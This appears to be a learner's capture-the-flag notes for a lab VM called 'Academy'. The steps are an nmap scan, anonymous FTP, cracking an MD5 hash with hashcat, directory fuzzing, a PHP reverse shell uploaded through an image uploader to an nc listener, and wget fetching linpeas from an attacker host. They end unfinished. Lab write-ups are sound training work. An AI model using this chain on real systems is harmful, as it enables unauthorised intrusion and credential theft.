IP: 192.168.16.130
Method to get IP:
- login root pass: tcm
- dhclient
- ip a
## Nmap results:
└─# nmap -p- -A -T4 192.168.16.130
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 02:33 EDT
Nmap scan report for 192.168.16.130
Host is up (0.00056s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
==**21/tcp open  ftp**     vsftpd 3.0.3==
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.16.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: ==Anonymous FTP login allowed== (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 ==note.txt==
==22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2== (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
==80/tcp open  http    Apache httpd 2.4.38== ((Debian))
|_http-title: Apache2 Debian Default Page: ==It works==
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:28:66:74 (VMware)
Device type: general purpose|router
==Running: Linux 4.X|5.X, MikroTik RouterOS 7.X==
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.1, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.16.130


## Note.txt
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('==10201321==', '', '==cd73502828457d15655bbd7a63fb0bc8==', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta


## Cracking the password
hashed pass: cd73502828457d15655bbd7a63fb0bc8
hash type: MD5 (used hashcat on linux to crack)
method: created a mousepad file "hashes.txt";
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
decrypted pass: student

## Gaining access to the site
### Guess method:
Just open the ip on firefox and do a /academy (as the machine is called academy) and this works
### Manual walkthrough Dirb (goes in too much detail:slow):
Using: dirb
In terminal: dirb http://192.168.16.130 (AHH)
### FFUF (faster)
install it first cuz its not already installed in kali
apt install ffuf
Command: **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u** http://192.168.16.130/FUZZ

## Attacking the machine
On the http://<ip>/academy, after login, there is a space to upload student's photo
Goal: upload a php reverse shell through image uploader
(pentestmonkey on github)
 Steps:
	 - Get the pentestmonkey php reverse shell raw file and save as a nano file in linux "shell.php"
	 - Change the ip to the attacker ip in the shell.php
	 - Turn on a nc listener "nc -nvlp 1234" 1234 being the default port in shell.php code
	 - Upload shell.php in image uploader
	 - BOOM! SHELL (not yet root tho)

Gaining root access/priv esc:
	 - Github linpeas: helps find priv esc path 
	 - Save linpeas.sh in a folder on linux
	 - Host a web sever in the folder above `python3 -m http.server 80`
	 - In the tmp folder do `wget http://<attackerIP>/linpeas.sh`
	 - Make it executable `chmod +x linpeas.sh`
	 - ./linpeas.sh
	What we are looking for in the results:
		 RED stuff (could lead to priv esc)
	We find grimmie username and his pass and some other stuff in a sql database
	
- ssh grimmie@<targetIP>
- Password: My_V3ryS3cur3_P4ss  (I could have misspelled smn)
I don't understand from here onward sorry future me :(

